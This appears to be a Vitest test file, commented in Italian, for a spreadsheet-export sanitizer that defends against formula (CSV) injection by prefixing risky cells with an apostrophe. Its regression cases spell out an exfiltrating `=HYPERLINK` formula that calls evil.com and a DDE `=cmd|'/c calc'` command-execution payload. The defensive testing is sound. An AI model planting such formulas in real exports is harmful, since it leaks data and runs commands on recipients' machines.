/**
 * Tests per `escapeFormulaInjection` — N13 audit
 * (OWASP WSTG-INPV-09 / CWE-1236).
 *
 * Excel/LibreOffice/Google Sheets interpretano una cella string che
 * inizia con `=`, `+`, `-`, `@`, TAB, CR come FORMULA.
 *
 * Mitigation: prefisso apex `'` neutralizza (cella diventa literal
 * string, apex non visibile nella view del cliente Excel).
 *
 * Il modulo non esporta `escapeFormulaInjection` (interno) ma il source
 * dichiara il pattern via FORMULA_PREFIX_REGEX — verifico via:
 *  1. Source inspection (regex pattern presente, applicato in addRow)
 *  2. Whitebox reproduction del sanitizer per testare invarianti
 */
import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const __dirname = dirname(fileURLToPath(import.meta.url));
const excelSource = readFileSync(join(__dirname, 'excel.ts'), 'utf-8');

describe('N13 — Excel formula injection: source guard presente', () => {
  it('FORMULA_PREFIX_REGEX dichiarato', () => {
    expect(excelSource).toMatch(/FORMULA_PREFIX_REGEX/);
  });

  it('regex copre `=`, `+`, `-`, `@`, TAB, CR (OWASP set)', () => {
    expect(excelSource).toMatch(/\[=\+\\-@\\t\\r\]/);
  });

  it('escapeFormulaInjection helper definito', () => {
    expect(excelSource).toMatch(/function escapeFormulaInjection/);
  });

  it('apex prefix usato come mitigation (template literal con apex iniziale)', () => {
    expect(excelSource).toMatch(/return\s+`'\$\{v\}`/);
  });

  it('chiamato dentro il loop addRow (out[c.key] = escapeFormulaInjection(raw))', () => {
    expect(excelSource).toMatch(/out\[c\.key\]\s*=\s*escapeFormulaInjection\(raw\)/);
  });
});

describe('N13 — escapeFormulaInjection behavioural reproduction (whitebox)', () => {
  const FORMULA_PREFIX_REGEX = /^[=+\-@\t\r]/;
  function escapeFormulaInjection(v: unknown): unknown {
    if (typeof v !== 'string') return v;
    if (v.length > 0 && FORMULA_PREFIX_REGEX.test(v)) return `'${v}`;
    return v;
  }

  it('string benigna → pass-through', () => {
    expect(escapeFormulaInjection('hello world')).toBe('hello world');
    expect(escapeFormulaInjection('Mario Rossi')).toBe('Mario Rossi');
  });

  it('REGRESSION: `=HYPERLINK(...)` → prefisso apex', () => {
    const evil = '=HYPERLINK("http://evil.com/?d="&A2,"click")';
    expect(escapeFormulaInjection(evil)).toBe(`'${evil}`);
  });

  it('REGRESSION: `=cmd|...` DDE legacy → prefisso apex', () => {
    expect(escapeFormulaInjection("=cmd|'/c calc'!A1")).toBe("'=cmd|'/c calc'!A1");
  });

  it('REGRESSION: `+SUM(...)` → prefisso apex', () => {
    expect(escapeFormulaInjection('+SUM(A1:A10)')).toBe("'+SUM(A1:A10)");
  });

  it('REGRESSION: `-1234` (numero in stringa) → prefisso apex (false positive accettabile)', () => {
    // Nota: questo e\` un false positive accettabile. Se l'utente esporta
    // numeri come stringhe negative ("-1234"), Excel lo vedra\` come testo.
    // L'export numerico vero (column format=number) NON passa di qui.
    expect(escapeFormulaInjection('-1234')).toBe("'-1234");
  });

  it('REGRESSION: `@SUM(...)` (Lotus legacy) → prefisso apex', () => {
    expect(escapeFormulaInjection('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  it('REGRESSION: TAB inizio → prefisso apex', () => {
    expect(escapeFormulaInjection('\t=SUM()')).toBe("'\t=SUM()");
  });

  it('REGRESSION: CR inizio → prefisso apex', () => {
    expect(escapeFormulaInjection('\r=evil()')).toBe("'\r=evil()");
  });

  it('number → pass-through (non sono formula-injectable)', () => {
    expect(escapeFormulaInjection(42)).toBe(42);
    expect(escapeFormulaInjection(0)).toBe(0);
    expect(escapeFormulaInjection(-1.5)).toBe(-1.5);
  });

  it('Date object → pass-through (non sono formula-injectable)', () => {
    const d = new Date('2026-05-29');
    expect(escapeFormulaInjection(d)).toBe(d);
  });

  it('null/undefined/boolean → pass-through', () => {
    expect(escapeFormulaInjection(null)).toBe(null);
    expect(escapeFormulaInjection(undefined)).toBe(undefined);
    expect(escapeFormulaInjection(true)).toBe(true);
    expect(escapeFormulaInjection(false)).toBe(false);
  });

  it('string vuota → pass-through (nessuna lunghezza, no trigger)', () => {
    expect(escapeFormulaInjection('')).toBe('');
  });

  it('string con `=` in MEZZO non al primo char → pass-through', () => {
    // Solo il PRIMO carattere triggera Excel.
    expect(escapeFormulaInjection('totale=42')).toBe('totale=42');
    expect(escapeFormulaInjection('OK=1')).toBe('OK=1');
  });

  it('string con `+` o `-` in mezzo (es. numero telefono) → pass-through', () => {
    expect(escapeFormulaInjection('+39 339 1234567')).toBe("'+39 339 1234567");
    // Nota: numero telefono "+39..." e\` false positive: Excel lo
    // interpreterebbe come somma. Apex e\` la mitigation corretta —
    // il numero appare testuale (giusto, e\` testo).
  });

  it('REGRESSION: email innocua che NON inizia con trigger char → pass-through', () => {
    expect(escapeFormulaInjection('mario@example.it')).toBe('mario@example.it');
  });

  it('REGRESSION: stringa con SOLO `@` come primo char → escape', () => {
    // Pattern Lotus legacy @ inizio = trigger.
    expect(escapeFormulaInjection('@example.com')).toBe("'@example.com");
  });
});
